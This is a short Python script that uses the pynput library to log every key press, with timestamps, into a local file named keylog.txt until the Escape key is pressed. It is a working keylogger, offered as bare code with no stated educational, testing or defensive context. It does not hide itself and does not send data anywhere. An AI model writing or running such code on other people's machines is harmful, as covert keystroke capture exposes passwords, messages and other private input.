import pynput
from pynput.keyboard import Key, Listener
import logging
import time

# Set up logging
logging.basicConfig(filename='keylog.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        # Log the key press
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        # Special keys like shift, enter, etc.
        logging.info(f'Special key pressed: {key}')

def on_release(key):
    if key == Key.esc:
        # Stop the listener if the escape key is pressed
        return False

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
